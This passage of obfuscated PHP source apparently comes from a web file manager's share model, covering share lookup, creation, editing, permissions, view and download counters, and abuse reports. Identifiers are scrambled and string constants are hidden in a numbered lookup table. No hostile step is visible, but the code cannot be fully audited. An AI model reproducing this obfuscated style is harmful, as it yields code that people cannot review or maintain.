array(array("\x6d\157\x64\x69\146\x79\124\x69\x6d\x65", "\164\x69\x6d\145", "\151\x6e\163\145\x72\x74\x2c\165\160\x64\x61\164\x65", "\146\x75\x6e\143\x74\151\157\x6e"), array("\x63\162\x65\141\164\145\x54\x69\155\x65", "\164\151\x6d\145", "\x69\x6e\x73\145\162\x74", "\146\165\x6e\143\164\151\157\156"), array("\x6f\160\x74\x69\157\x6e\x73", '', "\x69\x6e\163\145\162\164\54\165\160\x64\x61\164\145\54\163\145\x6c\x65\143\164", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($œËğÛø¬) { $¹ğš°õ‹ =& $_SERVER[ä¿÷‹µ±]; $óÛ°Ë’ = isset($œËğÛø¬[0]) ? $œËğÛø¬[0] : !1; return array($¹ğš°õ‹[1989] => array(USER_ID, $¹ğš°õ‹[1990]), $¹ğš°õ‹[1930] => array($óÛ°Ë’, $¹ğš°õ‹[1991])); } protected function listSimple() { $Ú‘Ù€Ø = array($_SERVER[ä¿÷‹µ±][1678] => USER_ID); $ËĞšƒ‘‘ = $this->field($this->fieldList)->where($Ú‘Ù€Ø)->select(); return $ËĞšƒ‘‘ ? $ËĞšƒ‘‘ : array(); } protected function getInfo($¥óÜó‹ó, $Ì–‹¼€Ä = false) { $î÷áÄ¼  =& $_SERVER[ä¿÷‹µ±]; if ($Ì–‹¼€Ä) { return $this->_getShareInfo(array($î÷áÄ¼ [489] => $¥óÜó‹ó)); } $Ã—îÄòö = $this->cacheFunctionGet($î÷áÄ¼ [1932], $¥óÜó‹ó); return $Ã—îÄòö; } public function getInfoByHash($ÖŠµü“) { return $this->_getShareInfo(array($_SERVER[ä¿÷‹µ±][491] => $ÖŠµü“)); } public function getInfoByPath($ÄŒä¢Êà) { $ÎÉÛ‰óı =& $_SERVER[ä¿÷‹µ±]; $ù¶ÖÏ÷³ = array($ÎÉÛ‰óı[1678] => USER_ID, $ÎÉÛ‰óı[402] => $ÄŒä¢Êà); return $this->_getShareInfo($ù¶ÖÏ÷³); } public function getInfoBySourcePath($Ò…¼úı÷) { $ÅÖ¤ó† =& $_SERVER[ä¿÷‹µ±]; $¨îää€è = array($ÅÖ¤ó†[1678] => USER_ID, $ÅÖ¤ó†[1198] => $Ò…¼úı÷); return $this->_getShareInfo($¨îää€è); } private function _getShareInfo($›èØèÇĞ) { $ú÷ê¿×÷ =& $_SERVER[ä¿÷‹µ±]; $ì»è´ˆ­ = $this->where($›èØèÇĞ)->find(); if (!$ì»è´ˆ­) { return !1; } $›èØèÇĞ = array($ú÷ê¿×÷[489] => $ì»è´ˆ­[$ú÷ê¿×÷[489]]); $°â×Ğ÷™ = $ú÷ê¿×÷[1992]; $ÜıÌÀ®„ = Model($ú÷ê¿×÷[602])->order($ú÷ê¿×÷[399])->field($°â×Ğ÷™)->where($›èØèÇĞ)->select(); if ($ì»è´ˆ­[$ú÷ê¿×÷[402]] == $ú÷ê¿×÷[197]) { $ì»è´ˆ­[$ú÷ê¿×÷[86]] = IO::info($ì»è´ˆ­[$ú÷ê¿×÷[1198]]); } else { $ì»è´ˆ­[$ú÷ê¿×÷[86]] = Model($ú÷ê¿×÷[1349])->pathInfo($ì»è´ˆ­[$ú÷ê¿×÷[402]]); } $ì»è´ˆ­[$ú÷ê¿×÷[1993]] = $ÜıÌÀ®„; return $ì»è´ˆ­; } protected function getInfoAuth($”¬ƒµÍß) { $²Ãƒ’™‹ =& $_SERVER[ä¿÷‹µ±]; $ÚçáœœÌ = $this->getInfo($”¬ƒµÍß); if ($ÚçáœœÌ[$²Ãƒ’™‹[1678]] == USER_ID) { $ÚçáœœÌ[$²Ãƒ’™‹[413]] = $ÚçáœœÌ[$²Ãƒ’™‹[86]][$²Ãƒ’™‹[413]]; } else { $ÚçáœœÌ[$²Ãƒ’™‹[413]] = Model($²Ãƒ’™‹[502])->authMake($ÚçáœœÌ[$²Ãƒ’™‹[1993]]); } return $ÚçáœœÌ; } protected function listData($¼š—ç¨‹ = null, $£›´Œ€¯ = 300) { $¯¡œ®«ü =& $_SERVER[ä¿÷‹µ±]; $…‚ø’ã = array(array($¯¡œ®«ü[494] => array($¯¡œ®«ü[1034], 0), $¯¡œ®«ü[496] => array($¯¡œ®«ü[1034], 0), $¯¡œ®«ü[1994] => $¯¡œ®«ü[1948])); if ($¼š—ç¨‹ == $¯¡œ®«ü[1995]) { $…‚ø’ã = array($¯¡œ®«ü[494] => 1); } else { if ($¼š—ç¨‹ == $¯¡œ®«ü[1183]) { $…‚ø’ã = array($¯¡œ®«ü[496] => 1); } } $…‚ø’ã[$¯¡œ®«ü[1678]] = USER_ID; $ÇàÎèÅ = $this->where($…‚ø’ã)->selectPage($£›´Œ€¯); return $ÇàÎèÅ; } protected function listToMe($¡ØüİèÖ = 300) { $ÔÎÅ‹å¥ =& $_SERVER[ä¿÷‹µ±]; $í£¿½›Ç = Model($ÔÎÅ‹å¥[1996])->userGroupParents(USER_ID); $™ÉÁ‹éø = array($ÔÎÅ‹å¥[586] => SourceModel::TYPE_USER, $ÔÎÅ‹å¥[505] => USER_ID); if ($í£¿½›Ç) { $™ÉÁ‹éø = array(array($ÔÎÅ‹å¥[586] => SourceModel::TYPE_USER, $ÔÎÅ‹å¥[505] => USER_ID), array($ÔÎÅ‹å¥[586] => SourceModel::TYPE_GROUP, $ÔÎÅ‹å¥[505] => array($ÔÎÅ‹å¥[7], $í£¿½›Ç)), $ÔÎÅ‹å¥[1994] => $ÔÎÅ‹å¥[1948]); } $½‡‘ˆ•‡ = Model($ÔÎÅ‹å¥[602])->where($™ÉÁ‹éø)->selectPage($¡ØüİèÖ); $˜ñæù‡÷ = array_to_keyvalue_group($½‡‘ˆ•‡[$ÔÎÅ‹å¥[369]], $ÔÎÅ‹å¥[489]); if (!$˜ñæù‡÷) { return $½‡‘ˆ•‡; } $ËÉ¤ƒ‚° = $ÔÎÅ‹å¥[1997]; $™ÉÁ‹éø = array($ÔÎÅ‹å¥[489] => array($ÔÎÅ‹å¥[418], array_keys($˜ñæù‡÷)), $ÔÎÅ‹å¥[1678] => array($ÔÎÅ‹å¥[1036], $ÔÎÅ‹å¥[197])); $Êö¨·“ï = $this->field($ËÉ¤ƒ‚°)->where($™ÉÁ‹éø)->select(); foreach ($Êö¨·“ï as $±ƒˆñÛª => &$¸È„ß‹) { $¸È„ß‹[$ÔÎÅ‹å¥[1993]] = $˜ñæù‡÷[$¸È„ß‹[$ÔÎÅ‹å¥[489]]]; } unset($¸È„ß‹); $£¼íŠ = array($ÔÎÅ‹å¥[1998] => $Êö¨·“ï, $ÔÎÅ‹å¥[1999] => $½‡‘ˆ•‡[$ÔÎÅ‹å¥[366]]); return $£¼íŠ; } protected function shareAdd($Ê¨†œä³, $£‹÷è³) { $˜ƒˆÎóÀ =& $_SERVER[ä¿÷‹µ±]; $¥ŒéÒü = $this->_addShareData($Ê¨†œä³, $£‹÷è³); if (!empty($£‹÷è³[$˜ƒˆÎóÀ[2000]])) { $this->_shareAuthSet($¥ŒéÒü, $£‹÷è³[$˜ƒˆÎóÀ[2000]]); } $this->shareEventAdd($Ê¨†œä³, $£‹÷è³, $˜ƒˆÎóÀ[1186]); return $¥ŒéÒü; } protected function shareAddSystem($¤Ã§íĞŠ, $€Ğ¬íˆ) { $‚Ò¬—õ¢ =& $_SERVER[ä¿÷‹µ±]; $¨…í¤† = $this->_addShareData($¤Ã§íĞŠ, $€Ğ¬íˆ, $‚Ò¬—õ¢[1298]); $this->_shareAuthSet($¨…í¤†, $€Ğ¬íˆ[$‚Ò¬—õ¢[2000]]); return $¨…í¤†; } private function shareEventAdd($§òŒ”Í‘, $‘×ëÊŸ, $òêúî˜ = "\141\144\144") { $ï—µ¹° =& $_SERVER[ä¿÷‹µ±]; if (!$§òŒ”Í‘ || $§òŒ”Í‘ == $ï—µ¹°[197]) { return; } if ($òêúî˜ == $ï—µ¹°[1186]) { if ($‘×ëÊŸ[$ï—µ¹°[494]] == $ï—µ¹°[88]) { Model($ï—µ¹°[570])->eventShare($§òŒ”Í‘, $ï—µ¹°[2001]); } if ($‘×ëÊŸ[$ï—µ¹°[496]] == $ï—µ¹°[88]) { Model($ï—µ¹°[570])->eventShare($§òŒ”Í‘, $ï—µ¹°[2002]); } return; } $æêŞèû° = $this->getInfoByPath($§òŒ”Í‘); $Â’½Ùšì = $ï—µ¹°[2003]; if ($æêŞèû°[$ï—µ¹°[494]] == $ï—µ¹°[197] && $‘×ëÊŸ[$ï—µ¹°[494]] == $ï—µ¹°[88]) { $Â’½Ùšì = $ï—µ¹°[2001]; } if ($æêŞèû°[$ï—µ¹°[494]] == $ï—µ¹°[88] && $‘×ëÊŸ[$ï—µ¹°[494]] == $ï—µ¹°[197]) { $Â’½Ùšì = $ï—µ¹°[2004]; } if ($æêŞèû°[$ï—µ¹°[496]] == $ï—µ¹°[197] && $‘×ëÊŸ[$ï—µ¹°[496]] == $ï—µ¹°[88]) { $Â’½Ùšì = $ï—µ¹°[2002]; } if ($æêŞèû°[$ï—µ¹°[496]] == $ï—µ¹°[88] && $‘×ëÊŸ[$ï—µ¹°[496]] == $ï—µ¹°[197]) { $Â’½Ùšì = $ï—µ¹°[2005]; } Model($ï—µ¹°[570])->eventShare($§òŒ”Í‘, $Â’½Ùšì); return; } private function _addShareData($ò¨¡ÔË¸, $­½¯Ú¾ù = array(), $ŒíŞŞä = false) { $Õ¿´Œøª =& $_SERVER[ä¿÷‹µ±]; $ ‰‰¿Ÿ˜ = $ŒíŞŞä == $Õ¿´Œøª[1298] ? 0 : USER_ID; $ñìö«ŞÔ = array($Õ¿´Œøª[417] => $ò¨¡ÔË¸, $Õ¿´Œøª[1669] => $ ‰‰¿Ÿ˜); if ($ò¨¡ÔË¸ == 0) { $ñìö«ŞÔ = array($Õ¿´Œøª[2006] => $­½¯Ú¾ù[$Õ¿´Œøª[1198]], $Õ¿´Œøª[1669] => $ ‰‰¿Ÿ˜); } if ($İ©ı™Õ = $this->where($ñìö«ŞÔ)->find()) { return $İ©ı™Õ[$Õ¿´Œøª[489]]; } if ($ò¨¡ÔË¸ == 0) { $ˆÒœôˆî = array($Õ¿´Œøª[32] => get_path_this($­½¯Ú¾ù[$Õ¿´Œøª[84]])); } else { $ˆÒœôˆî = Model($Õ¿´Œøª[844])->sourceInfo($ò¨¡ÔË¸); if (!$ˆÒœôˆî) { return !1; } } if (!$­½¯Ú¾ù[$Õ¿´Œøª[1576]]) { $­½¯Ú¾ù[$Õ¿´Œøª[1576]] = $ˆÒœôˆî[$Õ¿´Œøª[32]]; } $™²óŒÙÆ = array($Õ¿´Œøª[1669] => $ ‰‰¿Ÿ˜, $Õ¿´Œøª[417] => $ò¨¡ÔË¸, $Õ¿´Œøª[1576] => $Õ¿´Œøª[12], $Õ¿´Œøª[494] => 0, $Õ¿´Œøª[496] => 0, $Õ¿´Œøª[1198] => $Õ¿´Œøª[12], $Õ¿´Œøª[307] => $Õ¿´Œøª[12], $Õ¿´Œøª[909] => $Õ¿´Œøª[12], $Õ¿´Œøª[2007] => 0, $Õ¿´Œøª[2008] => 0, $Õ¿´Œøª[497] => 0, $Õ¿´Œøª[498] => $Õ¿´Œøª[12], $Õ¿´Œøª[491] => $Õ¿´Œøª[12]); $–¾ÊÓ¶ = explode($Õ¿´Œøª[50], $Õ¿´Œøª[2009]); foreach ($–¾ÊÓ¶ as $Ö¿§³óÄ) { if (!isset($­½¯Ú¾ù[$Ö¿§³óÄ])) { continue; } $™²óŒÙÆ[$Ö¿§³óÄ] = $­½¯Ú¾ù[$Ö¿§³óÄ]; } $ãÍÚŞãí = $this->add($™²óŒÙÆ); $¦É»ç¹Ô = array($Õ¿´Œøª[491] => short_id($ãÍÚŞãí)); $this->where(array($Õ¿´Œøª[488] => $ãÍÚŞãí))->save($¦É»ç¹Ô); return $ãÍÚŞãí; } private function _shareAuthSet($”·Ú¿ÍÏ, $ùÊÖ¯øî) { $ˆ™Ë Çó =& $_SERVER[ä¿÷‹µ±]; if (!is_array($ùÊÖ¯øî)) { return !1; } $«²³ÒÌŠ = Model($ˆ™Ë Çó[1958]); $«²³ÒÌŠ->where(array($ˆ™Ë Çó[489] => $”·Ú¿ÍÏ))->delete(); $€ˆ›ş—Ô = array(); foreach ($ùÊÖ¯øî as $Ä®—Âà) { $à¤ İ€³ = SourceModel::TYPE_USER; if ($Ä®—Âà[$ˆ™Ë Çó[411]] == SourceModel::TYPE_GROUP) { $à¤ İ€³ = SourceModel::TYPE_GROUP; } $²·ô…åì = array($ˆ™Ë Çó[489] => $”·Ú¿ÍÏ, $ˆ™Ë Çó[411] => $à¤ İ€³, $ˆ™Ë Çó[505] => intval($Ä®—Âà[$ˆ™Ë Çó[505]]), $ˆ™Ë Çó[1954] => 0, $ˆ™Ë Çó[2010] => -1); if ($Ä®—Âà[$ˆ™Ë Çó[1954]]) { $²·ô…åì[$ˆ™Ë Çó[1954]] = $Ä®—Âà[$ˆ™Ë Çó[1954]]; } else { if ($Ä®—Âà[$ˆ™Ë Çó[2010]]) { $²·ô…åì[$ˆ™Ë Çó[2010]] = $Ä®—Âà[$ˆ™Ë Çó[2010]]; } } $€ˆ›ş—Ô[] = $²·ô…åì; } return $«²³ÒÌŠ->addAll($€ˆ›ş—Ô, array(), !0); } public function numViewAdd($ö¼Ü½¤) { $ˆÔ€ó =& $_SERVER[ä¿÷‹µ±]; $òÉä = array($ˆÔ€ó[488] => $ö¼Ü½¤); $this->where($òÉä)->setAdd($ˆÔ€ó[2007]); } public function numDownloadAdd($àÔ¶–¾¬) { $·ğÑ‚™† =& $_SERVER[ä¿÷‹µ±]; $Ùş­™í‹ = array($·ğÑ‚™†[488] => $àÔ¶–¾¬); $this->where($Ùş­™í‹)->setAdd($·ğÑ‚™†[2008]); } protected function shareEdit($Õ€ïÔœ«, $ïŠ¸¡„ì) { $äÈÀİæ‚ =& $_SERVER[ä¿÷‹µ±]; $ÂÂïş—Ã = $this->getInfo($Õ€ïÔœ«); if (!$ÂÂïş—Ã) { return !1; } $this->_checkLinkShare($ïŠ¸¡„ì, $ÂÂïş—Ã); $Œ˜ÍÚï– = array(); $ËÂªä¢š = explode($äÈÀİæ‚[50], $äÈÀİæ‚[2011]); foreach ($ËÂªä¢š as $Óù‚³È) { if (!array_key_exists($Óù‚³È, $ïŠ¸¡„ì)) { continue; } $Œ˜ÍÚï–[$Óù‚³È] = $ïŠ¸¡„ì[$Óù‚³È]; } $this->shareEventAdd($ÂÂïş—Ã[$äÈÀİæ‚[402]], $ïŠ¸¡„ì, $äÈÀİæ‚[1820]); $this->where(array($äÈÀİæ‚[488] => $Õ€ïÔœ«))->save($Œ˜ÍÚï–); if (isset($ïŠ¸¡„ì[$äÈÀİæ‚[2000]])) { $this->_shareAuthSet($Õ€ïÔœ«, $ïŠ¸¡„ì[$äÈÀİæ‚[2000]]); } return !0; } private function _checkLinkShare($®áõöî, $ºİîô­ß) { $Öúë©Ü¨ =& $_SERVER[ä¿÷‹µ±]; if ($®áõöî[$Öúë©Ü¨[494]] != $Öúë©Ü¨[88]) { return; } $´¦¦õ»Ä = $ºİîô­ß[$Öúë©Ü¨[86]][$Öúë©Ü¨[402]]; if ($ºİîô­ß[$Öúë©Ü¨[86]][$Öúë©Ü¨[33]] != $Öúë©Ü¨[199]) { $°“¥î‰¨ = $this->_folderReport($´¦¦õ»Ä); if (!$°“¥î‰¨) { return; } show_json(LNG($Öúë©Ü¨[2012]) . $Öúë©Ü¨[2013] . $°“¥î‰¨, !1); } $¯È«È´¼ = Model($Öúë©Ü¨[844])->fileInfoGet($ºİîô­ß[$Öúë©Ü¨[86]][$Öúë©Ü¨[402]]); if (!$¯È«È´¼) { return; } $ÖùëÛÌ³ = $this->shareFileMeta($¯È«È´¼[$Öúë©Ü¨[468]]); if (isset($ÖùëÛÌ³[$Öúë©Ü¨[374]]) && $ÖùëÛÌ³[$Öúë©Ü¨[374]] == $Öúë©Ü¨[88]) { show_json(LNG($Öúë©Ü¨[2014]), !1); } } private function _folderReport($ßğ¤ë¯£) { $ğ¤’é„ä =& $_SERVER[ä¿÷‹µ±]; $®îõ¡ = array($ğ¤’é„ä[468] => array($ğ¤’é„ä[1034], 0), $ğ¤’é„ä[769] => 3); $Óè¼‹†› = Model($ğ¤’é„ä[2015])->where($®îõ¡)->field($ğ¤’é„ä[468])->select(); if (!$Óè¼‹†›) { return !1; } $Óè¼‹†› = array_to_keyvalue($Óè¼‹†›, $ğ¤’é„ä[12], $ğ¤’é„ä[468]); $¬¯¸Úµ = $ğ¤’é„ä[50] . $ßğ¤ë¯£ . $ğ¤’é„ä[50]; $®îõ¡ = array($ğ¤’é„ä[468] => array($ğ¤’é„ä[7], $Óè¼‹†›), $ğ¤’é„ä[521] => array($ğ¤’é„ä[383], "\x25{$¬¯¸Úµ}\45"), $ğ¤’é„ä[431] => 0); $³³ˆè’¶ = Model($ğ¤’é„ä[844])->where($®îõ¡)->field($ğ¤’é„ä[2016])->find(); if (!$³³ˆè’¶) { return !1; } $Šåæ¦Ø™ = substr($³³ˆè’¶[$ğ¤’é„ä[521]], strpos($³³ˆè’¶[$ğ¤’é„ä[521]], $¬¯¸Úµ)); $®îõ¡ = array($ğ¤’é„ä[402] => array($ğ¤’é„ä[7], trim($Šåæ¦Ø™, $ğ¤’é„ä[50]))); $ÉÚİ˜ = Model($ğ¤’é„ä[844])->where($®îõ¡)->field($ğ¤’é„ä[32])->select(); $Í¡Ü¿ŞÁ = array_to_keyvalue($ÉÚİ˜, $ğ¤’é„ä[12], $ğ¤’é„ä[32]); $Í¡Ü¿ŞÁ[] = $³³ˆè’¶[$ğ¤’é„ä[32]]; return implode($ğ¤’é„ä[8], $Í¡Ü¿ŞÁ); } protected function remove($Àáâ·—ù) { $ªú¦Üô¬ =& $_SERVER[ä¿÷‹µ±]; if (is_array($Àáâ·—ù)) { $Àáâ·—ù = array($ªú¦Üô¬[7], $Àáâ·—ù); } $Öùû¬Ê£ = array($ªú¦Üô¬[489] => $Àáâ·—ù); $óÂä‚¯ = $this->where($Öùû¬Ê£)->delete(); if ($óÂä‚¯) { Model($ªú¦Üô¬[602])->where(array($ªú¦Üô¬[489] => $Àáâ·—ù))->delete(); } $Ùı´ãô = is_array($Àáâ·—ù) ? $Àáâ·—ù[1] : array($Àáâ·—ù); for ($‹ØœãÒ‰ = 0; $‹ØœãÒ‰ < count($Ùı´ãô); $‹ØœãÒ‰++) { $Æö¸ÉºÕ = $this->getInfo($Ùı´ãô[$‹ØœãÒ‰]); if ($Æö¸ÉºÕ[$ªú¦Üô¬[496]] == $ªú¦Üô¬[88]) { Model($ªú¦Üô¬[570])->eventShare($Æö¸ÉºÕ[$ªú¦Üô¬[402]], $ªú¦Üô¬[2005]); } if ($Æö¸ÉºÕ[$ªú¦Üô¬[494]] == $ªú¦Üô¬[88]) { Model($ªú¦Üô¬[570])->eventShare($Æö¸ÉºÕ[$ªú¦Üô¬[402]], $ªú¦Üô¬[2004]); } } return $óÂä‚¯; } protected function removeBySource($È¸·µÎ) { $ƒİƒòËÃ =& $_SERVER[ä¿÷‹µ±]; $ŒÁ®¤í¢ = array($ƒİƒòËÃ[417] => array($ƒİƒòËÃ[418], $È¸·µÎ)); $ã­˜Œ³ó = $this->field($ƒİƒòËÃ[489])->where($ŒÁ®¤í¢)->select(); $ã­˜Œ³ó = array_to_keyvalue($ã­˜Œ³ó, $ƒİƒòËÃ[12], $ƒİƒòËÃ[489]); if (!$ã­˜Œ³ó) { return; } $ŒÁ®¤í¢ = array($ƒİƒòËÃ[488] => array($ƒİƒòËÃ[418], $ã­˜Œ³ó)); $this->where($ŒÁ®¤í¢)->delete(); Model($ƒİƒòËÃ[602])->where($ŒÁ®¤í¢)->delete(); } public function listAll($ÉÓñ’“”) { $à°ƒç¶µ =& $_SERVER[ä¿÷‹µ±]; $×Ìâ® = array(); if ($ÉÓñ’“”[$à°ƒç¶µ[1678]]) { $×Ìâ®[$à°ƒç¶µ[1678]] = $ÉÓñ’“”[$à°ƒç¶µ[1678]]; } if ($ÉÓñ’“”[$à°ƒç¶µ[780]]) { $öœªµ…Ç = $ÉÓñ’“”[$à°ƒç¶µ[497]] ? $ÉÓñ’“”[$à°ƒç¶µ[497]] : strtotime(date($à°ƒç¶µ[2017])); $×Ìâ®[$à°ƒç¶µ[200]] = array($à°ƒç¶µ[333], array($ÉÓñ’“”[$à°ƒç¶µ[780]], $öœªµ…Ç)); } if ($ÉÓñ’“”[$à°ƒç¶µ[33]]) { $×Ìâ®[$ÉÓñ’“”[$à°ƒç¶µ[33]]] = 1; } else { $×Ìâ®[] = array($à°ƒç¶µ[494] => array($à°ƒç¶µ[1034], 0), $à°ƒç¶µ[496] => array($à°ƒç¶µ[1034], 0), $à°ƒç¶µ[1994] => $à°ƒç¶µ[1948]); } if ($ÉÓñ’“”[$à°ƒç¶µ[1944]]) { $×Ìâ®[] = array($à°ƒç¶µ[491] => $ÉÓñ’“”[$à°ƒç¶µ[1944]], $à°ƒç¶µ[1576] => array($à°ƒç¶µ[383], "\x25{$ÉÓñ’“”[$à°ƒç¶µ[1944]]}\x25"), $à°ƒç¶µ[1994] => $à°ƒç¶µ[1948]); } $¨ôë¶ú† = $this->_makeOrder()->where($×Ìâ®)->selectPage(20); if (empty($¨ôë¶ú†[$à°ƒç¶µ[369]])) { return array(); } $this->_listDataApply($¨ôë¶ú†[$à°ƒç¶µ[369]]); return $¨ôë¶ú†; } public function listDataApply($¯œØÌ·¹) { $this->_listDataApply($¯œØÌ·¹); return $¯œØÌ·¹; } private function _listDataApply(&$ÈÜ¥½Óï) { $ı­¶ı¨” =& $_SERVER[ä¿÷‹µ±]; $ö˜ç¿à‡ = array_to_keyvalue($ÈÜ¥½Óï, $ı­¶ı¨”[12], $ı­¶ı¨”[1678]); $»¼ÑÂ– = Model($ı­¶ı¨”[535])->userListInfo(array_unique($ö˜ç¿à‡)); $äÕ¯§†À = array_to_keyvalue($ÈÜ¥½Óï, $ı­¶ı¨”[12], $ı­¶ı¨”[402]); $Şıâ ‹ = Model($ı­¶ı¨”[844])->sourceListInfo($äÕ¯§†À, !0); foreach ($ÈÜ¥½Óï as $›¹¼ø‘¸ => &$¯‘Àºò²) { $ÚúƒØŞ· = $¯‘Àºò²[$ı­¶ı¨”[1678]]; $¯‘Àºò²[$ı­¶ı¨”[2018]] = $»¼ÑÂ–[$ÚúƒØŞ·] ? $»¼ÑÂ–[$ÚúƒØŞ·] : !1; $„È™ïÚ = $¯‘Àºò²[$ı­¶ı¨”[402]]; $¯‘Àºò²[$ı­¶ı¨”[86]] = $Şıâ ‹[$„È™ïÚ] ? $Şıâ ‹[$„È™ïÚ] : !1; if ($¯‘Àºò²[$ı­¶ı¨”[86]][$ı­¶ı¨”[431]] == $ı­¶ı¨”[88]) { unset($ÈÜ¥½Óï[$›¹¼ø‘¸]); } if ($¯‘Àºò²[$ı­¶ı¨”[86]] != $ı­¶ı¨”[197] && !$¯‘Àºò²[$ı­¶ı¨”[86]]) { unset($ÈÜ¥½Óï[$›¹¼ø‘¸]); } } unset($¯‘Àºò²); $ÈÜ¥½Óï = array_values($ÈÜ¥½Óï); } private function _makeOrder($ÆÖ…€Ã® = '') { $Ü€ÙçÙÊ =& $_SERVER[ä¿÷‹µ±]; $¿šù˜İÍ = array($Ü€ÙçÙÊ[200], $Ü€ÙçÙÊ[497], $Ü€ÙçÙÊ[2007], $Ü€ÙçÙÊ[2008]); $“¦ÊÅ¥ö = array($Ü€ÙçÙÊ[450] => $Ü€ÙçÙÊ[451], $Ü€ÙçÙÊ[452] => $Ü€ÙçÙÊ[453]); $Úù¨¼ = Input::get($Ü€ÙçÙÊ[457], $Ü€ÙçÙÊ[7], $Ü€ÙçÙÊ[423], $¿šù˜İÍ); $òÇ¶¸ì = Input::get($Ü€ÙçÙÊ[458], $Ü€ÙçÙÊ[7], $Ü€ÙçÙÊ[2019], array($Ü€ÙçÙÊ[1941], $Ü€ÙçÙÊ[452])); $òÇ¶¸ì = $“¦ÊÅ¥ö[$òÇ¶¸ì]; $ÆÖ…€Ã® = $ÆÖ…€Ã® . "{$Úù¨¼}\x20{$òÇ¶¸ì}"; return $this->order($ÆÖ…€Ã®); } public function reportAdd($×Åâ¥ğÙ) { $ĞöûÌÒá =& $_SERVER[ä¿÷‹µ±]; $¥¢éŸ©ô = array($ĞöûÌÒá[489] => $×Åâ¥ğÙ[$ĞöûÌÒá[489]], $ĞöûÌÒá[1678] => USER_ID); if (Model($ĞöûÌÒá[2015])->where($¥¢éŸ©ô)->find()) { return !1; } $¼Çò¯­¡ = array($ĞöûÌÒá[489] => $×Åâ¥ğÙ[$ĞöûÌÒá[489]], $ĞöûÌÒá[1576] => $×Åâ¥ğÙ[$ĞöûÌÒá[1576]], $ĞöûÌÒá[402] => $×Åâ¥ğÙ[$ĞöûÌÒá[402]], $ĞöûÌÒá[468] => $×Åâ¥ğÙ[$ĞöûÌÒá[468]], $ĞöûÌÒá[1678] => USER_ID, $ĞöûÌÒá[33] => $×Åâ¥ğÙ[$ĞöûÌÒá[33]], $ĞöûÌÒá[453] => $×Åâ¥ğÙ[$ĞöûÌÒá[453]]); return Model($ĞöûÌÒá[2015])->add($¼Çò¯­¡); } public function reportList($æî›¢®ô) { $´ıİËäœ =& $_SERVER[ä¿÷‹µ±]; $ËÂÕã¡æ = array(); if ($æî›¢®ô[$´ıİËäœ[780]]) { $ê•¼ÓİÅ = $æî›¢®ô[$´ıİËäœ[497]] ? $æî›¢®ô[$´ıİËäœ[497]] : strtotime(date($´ıİËäœ[2017])); $ËÂÕã¡æ[$´ıİËäœ[200]] = array($´ıİËäœ[333], array($æî›¢®ô[$´ıİËäœ[780]], $ê•¼ÓİÅ)); } if (isset($æî›¢®ô[$´ıİËäœ[33]]) && in_array($æî›¢®ô[$´ıİËäœ[33]], array($´ıİËäœ[88], $´ıİËäœ[437], $´ıİËäœ[2020], $´ıİËäœ[2021], $´ıİËäœ[2022]))) { $ËÂÕã¡æ[$´ıİËäœ[33]] = $æî›¢®ô[$´ıİËäœ[33]]; } if (isset($æî›¢®ô[$´ıİËäœ[769]]) && in_array($æî›¢®ô[$´ıİËäœ[769]], array($´ıİËäœ[197], $´ıİËäœ[88], $´ıİËäœ[437], $´ıİËäœ[2020]))) { $ËÂÕã¡æ[$´ıİËäœ[769]] = $æî›¢®ô[$´ıİËäœ[769]]; } $üÌİ…Ï = Input::get($´ıİËäœ[458], $´ıİËäœ[7], $´ıİËäœ[2019], array($´ıİËäœ[1941], $´ıİËäœ[452])); $¹œ’ÑÖ = array($´ıİËäœ[450] => $´ıİËäœ[451], $´ıİËäœ[452] => $´ıİËäœ[453]); $Æ˜›î¿ = $´ıİËäœ[2023] . $¹œ’ÑÖ[$üÌİ…Ï]; $şÆ¨” = Model($´ıİËäœ[2015])->where($ËÂÕã¡æ)->order($Æ˜›î¿)->selectPage(20); if (empty($şÆ¨”[$´ıİËäœ[369]])) { return array(); } $ìàìÙ´± = array_to_keyvalue_group($şÆ¨”[$´ıİËäœ[369]], $´ıİËäœ[769], $´ıİËäœ[489]); if (!empty($ìàìÙ´±[0])) { $æî›¢®ô = $ìàìÙ´±[0]; $ËÂÕã¡æ = array($´ıİËäœ[489] => array($´ıİËäœ[7], $æî›¢®ô)); $ŸäõùûØ = $this->where($ËÂÕã¡æ)->field($´ıİËäœ[489])->select(); $ŸäõùûØ = array_to_keyvalue($ŸäõùûØ, $´ıİËäœ[12], $´ıİËäœ[489]); $±‰ˆñöÍ = array_diff($æî›¢®ô, $ŸäõùûØ); if (!empty($±‰ˆñöÍ)) { foreach ($şÆ¨”[$´ıİËäœ[369]] as $Ù¢¨é¯À => $·êÍŸ»±) { if (in_array($·êÍŸ»±[$´ıİËäœ[489]], $±‰ˆñöÍ)) { unset($şÆ¨”[$´ıİËäœ[369]][$Ù¢¨é¯À]); } } } } $this->_listDataApply($şÆ¨”[$´ıİËäœ[369]]); return $şÆ¨”; } public function reportStatus($¯ä´Ùè¶) { $×“›Ó˜‚ =& $_SERVER[ä¿÷‹µ±]; $ÊÆ‚–¤ä = array($×“›Ó˜‚[399] => $¯ä´Ùè¶[$×“›Ó˜‚[399]]); $Òğåûøß = Model($×“›Ó˜‚[2015])->where($ÊÆ‚–¤ä)->field($×“›Ó˜‚[2024])->find(); if (!$Òğåûøß) { return !1; } $ªïÀ™Üº = array($×“›Ó˜‚[769] => $¯ä´Ùè¶[$×“›Ó˜‚[769]]); if ($¯ä´Ùè¶[$×“›Ó˜‚[769]] == $×“›Ó˜‚[2020] && $Òğåûøß[$×“›Ó˜‚[769]] == $×“›Ó˜‚[2020]) { $ªïÀ™Üº[$×“›Ó˜‚[769]] = 0; } $¸šÏ†ø· = Model($×“›Ó˜‚[2015])->where($ÊÆ‚–¤ä)->save($ªïÀ™Üº); if ($¯ä´Ùè¶[$×“›Ó˜‚[769]] == $×“›Ó˜‚[437]) { if ($Òğåûøß[$×“›Ó˜‚[468]] != $×“›Ó˜‚[197] && $this->shareFileMeta($Òğåûøß[$×“›Ó˜‚[468]])) { $this->shareFileMeta($Òğåûøß[$×“›Ó˜‚[468]], 0); } $this->remove($Òğåûøß[$×“›Ó˜‚[489]]); return !0; } if ($¸šÏ†ø· && $¯ä´Ùè¶[$×“›Ó˜‚[769]] == $×“›Ó˜‚[2020]) { $Àß‹ú³Ù = $ªïÀ™Üº[$×“›Ó˜‚[769]] == $×“›Ó˜‚[2020] ? 1 : 0; $this->shareFileMeta($Òğåûøß[$×“›Ó˜‚[468]], $Àß‹ú³Ù); $this->removeByFile($Òğåûøß[$×“›Ó˜‚[468]]); } return $¸šÏ†ø·; } private function removeByFile($ÍÇÊÆõó) { 